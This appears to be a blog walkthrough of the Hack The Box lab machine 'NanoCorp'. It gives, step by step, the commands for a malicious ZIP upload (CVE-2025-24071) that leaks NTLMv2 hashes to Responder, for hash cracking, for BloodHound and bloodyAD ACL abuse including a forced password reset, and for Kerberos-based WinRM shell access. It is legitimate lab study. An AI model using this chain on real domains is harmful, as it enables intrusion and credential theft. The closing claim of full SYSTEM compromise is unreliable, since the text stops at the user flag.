---
title: "Hack The Box: NanoCorp Walkthrough"
date: 2026-03-12
categories: ["HackTheBox", "Active Directory", "Windows"]
tags: ["walkthrough", "windows", "active directory", "hard"]
image:
  path: /assets/nanocorp/cover.png
---

## Machine Overview
* **Machine Name:** NanoCorp  
* **Difficulty:** Hard  
* **Operating System:** Windows  

This is a write-up for the Hack The Box machine **NanoCorp**. This challenge simulates a realistic enterprise Active Directory environment where multiple misconfigurations allow an attacker to escalate privileges from a low-level foothold to full **SYSTEM compromise**.

The machine demonstrates several modern enterprise attack techniques including:

- NTLMv2 hash capture and cracking
- Kerberos ticket abuse
- Active Directory ACL privilege escalation
- BloodHound analysis
- WinRM authentication

Before beginning, the hostname was added to the local hosts file:

```shell
10.10.11.93 nanocorp.htb dc01.nanocorp.htb nanocorp.htb0
```

---

# Enumeration

## Nmap Scan
Initial reconnaissance was performed to identify running services.

```shell
nmap -sCV -A 10.10.11.93
```

### Open Ports
![Desktop View](/assets/nanocorp/1.png){: width="700" height="400" .normal }

```shell
53/tcp   DNS
80/tcp   HTTP (Apache 2.4.58 / PHP 8.2.12)
88/tcp   Kerberos
135/tcp  RPC
139/tcp  SMB
389/tcp  LDAP
445/tcp  SMB
464/tcp  Kerberos password change
636/tcp  LDAPS
3268/tcp Global Catalog LDAP
3269/tcp Global Catalog LDAPS
5986/tcp WinRM (HTTPS)
```

The presence of **Kerberos, LDAP, SMB, and DNS** strongly indicates that the target is a **Windows Active Directory Domain Controller**.

---

# Web Enumeration (Port 80)

Visiting the web application revealed a corporate-style website.

The page redirected automatically to:

```shell
http://nanocorp.htb
```

![Desktop View](/assets/nanocorp/4.png){: width="700" height="400" .normal }

Directory enumeration was performed using DirBuster.

```shell
dirbuster -u http://nanocorp.htb
```

### Discovered Directories

```shell
/img
/js
/css
/slick
/icons
/cgi-bin (403)
```

Most content appeared static and built with Bootstrap and Slick libraries.

However, navigating through the interface revealed a **Hiring Portal**.

---

# Discovering a Subdomain

Clicking the **Apply Now** button on the website redirected to a new subdomain:



```shell
http://hire.nanocorp.htb
```

The subdomain was added to `/etc/hosts` to ensure proper resolution.

```shell
10.10.11.93 hire.nanocorp.htb
```

---

# Hiring Portal Enumeration

The hiring page contained a job application form with the following fields:

- Full Name
- Email
- Position Selection
- File Upload

![Desktop View](/assets/nanocorp/5.png){: width="700" height="400" .normal }


The upload functionality accepted **ZIP files**, which immediately suggested a potential attack vector.

---

# Initial Access

## Exploiting ZIP Processing (CVE-2025-24071)

Research revealed a vulnerability affecting applications that improperly process uploaded ZIP archives.

A public proof-of-concept exploit was cloned:

```shell
git clone https://github.com/0x6rss/CVE-2025-24071_PoC
```

The payload generator script was executed:

```shell
python3 poc.py
```

The script required:

- Payload filename
- Attacker VPN IP

Once completed, the exploit generated a malicious archive:

```shell
exploit.zip
```

![Desktop View](/assets/nanocorp/6.png){: width="700" height="400" .normal }

---

# Capturing NTLMv2 Hashes

Before uploading the payload, **Responder** was started to capture authentication attempts.

```shell
sudo responder -I tun0 -v
```

After submitting the malicious ZIP through the hiring portal, the server attempted authentication to the attacker machine.

Responder captured multiple NTLMv2 hashes:

```shell
NANOCORP\web_svc
```

Example output:
![Desktop View](/assets/nanocorp/7.png){: width="700" height="400" .normal }


```shell
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:<hash>
```

---

# Credential Cracking

The captured hash was saved to a file.

```shell
hash.txt
```

It was then cracked using **John the Ripper**.

```shell
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Password recovered:

![Desktop View](/assets/nanocorp/8.png){: width="700" height="400" .normal }


```shell
dksehdgh712!@#
```

Account compromised:

```shell
NANOCORP\web_svc
```

---

# SMB Enumeration

Using the recovered credentials to enumerate SMB shares:

```shell
smbclient -L //10.10.11.93 -U WEB_SVC
```

### Discovered Shares

![Desktop View](/assets/nanocorp/15.png){: width="700" height="400" .normal }


```shell
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
```

The presence of **NETLOGON** and **SYSVOL** confirms the host is the **Domain Controller**.

---

### users Enumeration

```shell


nxc smb <dc_ip> -u'<user>' -p'<password>' --users

```

![Desktop View](/assets/nanocorp/9.png){: width="700" height="400" .normal }

```shell
Administrator
Guest
krbtgt
web_svc
monitoring_svc
```


# Kerberos Authentication

Kerberos requires synchronized system time. The attacker system clock was synchronized with the domain controller.

```shell
sudo ntpdate 10.10.11.93
```

A Kerberos **Ticket Granting Ticket (TGT)** was requested using Impacket.

```shell
impacket-getTGT nanocorp.htb/WEB_SVC:dksehdgh712!@#
```

The ticket was exported for later use.

```shell
export KRB5CCNAME=WEB_SVC.ccache
```

---

# Active Directory Enumeration

## BloodHound Collection

Active Directory data was collected using BloodHound.

```shell
bloodhound-python -u WEB_SVC -p dksehdgh712!@# -d nanocorp.htb \
-ns 10.10.11.93 -c All
```

BloodHound revealed several objects:

```
1 Domain
1 Computer
6 Users
53 Groups
```

Analysis showed that **WEB_SVC** had Addself Right  on  IT_SUPPORT group and this group has right force change password on monitoring_svc account in the domain.

![Desktop View](/assets/nanocorp/10.png){: width="700" height="400" .normal }

![Desktop View](/assets/nanocorp/11.png){: width="700" height="400" .normal }

---

# Privilege Escalation

## ACL Abuse

Using **bloodyAD**, the compromised account was added to the **IT_Support** group.

```shell
bloodyAD --host dc01.nanocorp.htb \
-d nanocorp.htb \
-u web_svc \
-p dksehdgh712!@# \
add groupMember it_support web_svc
```

The operation succeeded.

![Desktop View](/assets/nanocorp/12.png){: width="700" height="400" .normal }

```shell
web_svc added to it_support
```

---

## Password Reset Attack

BloodHound also revealed that the account could reset the password of another service account.

```shell
monitoring_svc
```

Password was reset using bloodyAD.

```shell
bloodyAD --host dc01.nanocorp.htb \
-d nanocorp.htb \
-u web_svc \
-p dksehdgh712!@# \
set password monitoring_svc Password@123
```
![Desktop View](/assets/nanocorp/13.png){: width="700" height="400" .normal }

---

# Pivoting to monitoring_svc

A Kerberos ticket was generated for the newly compromised account.

```shell
impacket-getTGT nanocorp.htb/monitoring_svc:Password@123
```

The ticket was exported:

```shell
export KRB5CCNAME=monitoring_svc.ccache
```

![Desktop View](/assets/nanocorp/14.png){: width="700" height="400" .normal }
---

# WinRM Access

The machine exposed **WinRM over HTTPS** on port 5986.

A lightweight WinRM execution tool was cloned:

```shell
git clone https://github.com/ozelis/winrmexec.git
```

Using Kerberos authentication:

```shell
python3 winrmexec.py -ssl -port 5986 \
-k nanocorp.htb/monitoring_svc@dc01.nanocorp.htb \
-no-pass
```

This provided an interactive PowerShell session.

```shell
PS C:\Users\monitoring_svc\Documents>
```

---

# Capturing the User Flag

Navigating to the desktop revealed the user flag.

```shell
cd ..
cd Desktop
dir
```

```shell
user.txt
```

Displaying the flag:

```shell
type user.txt
```

---


# Conclusion

NanoCorp is an excellent **hard-difficulty Active Directory machine** that demonstrates how multiple small misconfigurations can combine into a complete domain compromise.

The attack chain included:

- Web application abuse
- NTLMv2 credential capture
- Password cracking
- Kerberos ticket manipulation
- BloodHound privilege escalation
- ACL abuse
- WinRM shell access

This machine is a great exercise in **real-world enterprise Active Directory exploitation from foothold to full SYSTEM compromise**.

## Happy Hacking 👾